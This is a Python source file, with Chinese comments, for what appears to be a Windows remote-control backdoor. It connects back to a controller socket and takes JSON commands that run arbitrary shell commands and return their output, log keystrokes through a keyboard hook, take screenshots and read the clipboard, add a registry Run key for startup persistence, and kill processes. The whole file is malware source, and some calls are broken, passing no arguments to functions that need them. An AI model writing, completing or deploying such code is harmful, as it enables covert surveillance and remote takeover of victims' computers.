import json

import pythoncom
import psutil
import os
import subprocess
import socket
import PyHook3
import winreg
from PIL import ImageGrab, Image


# 执行系统命令
def run_command(command):
    global child
    command = command.split(' ')
    print(command)
    child = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(child)
    return_message = child.stdout
    if child.returncode != 0:
        child = "can not execute the command..."
        return_message = child.encode(encoding='gbk')
    return return_message


# 监听键盘事件
def keybord_listen():
    list = []

    def OnKeyboardEvent(event):
        # 当前键盘事件发生的窗口名到列表中
        list.append(event.WindowName)
        # 输出当前键盘事件的ASCII值到列表中
        list.append(chr(event.Ascii))
        # print(list)
        # 监听指定窗口
        # handler = FindWindow(None, 'windowName')
        # if handler:
        #     print(">>" + chr(event.Ascii) + "<<")
        return list

    hm = PyHook3.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


# 截屏
def get_image(save_path):
    # 截屏操作
    im = ImageGrab.grab()
    # 将截屏图片保存
    im.save(save_path)
    # 获取剪切板内容
    imp = ImageGrab.grabclipboard()
    # 判断剪切板内容非空
    if isinstance(imp, Image.Image):
        # 保存位置，windows目录需要转义
        im.save(save_path)
    else:
        print("剪切版啥也没有 (○´･д･)ﾉ")


# 修改注册表，开机自启动
def live_forever(file_path):
    exec_path = file_path
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                         winreg.KEY_ALL_ACCESS)
    new_key = winreg.CreateKey(key, 'MyNewKey')
    winreg.SetValueEx(key, "MyNewKey", 0, winreg.REG_SZ, exec_path)
    winreg.CloseKey(key)


# 控制系统进程

def kill_pid():
    # 显示PID
    def show_pid():
        print("----------显示所有进程----------\n")
        pids = psutil.pids()
        for pid in pids:
            p = psutil.Process(pid)
            process_name = p.name()
            print("进程为：" + process_name + "--> pid为：" + str(pid))
        print("----------我是一个分割线----------")

    show_pid()

    # 杀死某一指定PID进程
    def kill_one_pid(pid_num):
        pids = psutil.pids()
        for pid in pids:
            if pid_num == pid:
                process = 'taskkill.exe /f /PID ' + str(pid_num)
                os.system(process)
                print("已结束pid为" + str(pid_num) + "进程")

    # 主体控制
    while True:
        try:
            pid_num = int(input("0 --> 退出\n"
                                "1 --> 刷新进程列表\n"
                                "部分进程可能杀死不成功 (⊙﹏⊙)\n"
                                "请输入要杀死的pid号 ▄︻┻┳═一……:"))
            if pid_num == 0:
                print("( ﾟдﾟ)つBye")
                break
            elif pid_num == 1:
                show_pid()
                pass
            else:
                kill_one_pid(pid_num)
        except:
            print("输入有误，重新输入 •﹏• !")
            pass


# 接受数据
def recv_data(client):
    data_recv = client.recv(2048)
    try:
        data = str(data_recv, 'gbk')
    except:
        data = str(data_recv, 'utf-8')
    # 将JSON数据转字典
    data_recv = json.loads(data_recv)
    print(data_recv)
    return data_recv


# 判断执行选项
def which_op(data_recv, client):
    op = data_recv['op']
    # 1 --> 执行命令
    if op == '1':
        data = data_recv['data']
        output = run_command(data)
        client.send(output)
    # 2 --> 监听键盘输出
    elif op == '2':
        keybord_listen()
    # 3 --> 截屏, 查看剪切板截图
    elif op == '3':
        get_image()
    # 4 --> 修改注册表
    elif op == '4':
        live_forever()
    # 5 --> 控制系统进程
    elif op == '5':
        kill_pid()


# 主函数
def main():
    # 绑定的IP与端口
    Host, Port = "127.0.0.1", 6666
    client = socket.socket()
    while True:
        # 连接
        status_code = client.connect_ex((Host, Port))
        # print(code)
        Message = "Welcome!"
        if int(status_code) == 0:
            # 发送连接成功提醒
            client.send(Message.encode(encoding='gbk'))
            while True:
                # 接收客户端发来的数据
                data_recv = recv_data(client)
                # 根据数据包选择执行
                which_op(data_recv, client)
        else:
            print("连接失败")
            pass


if __name__ == "__main__":
    main()
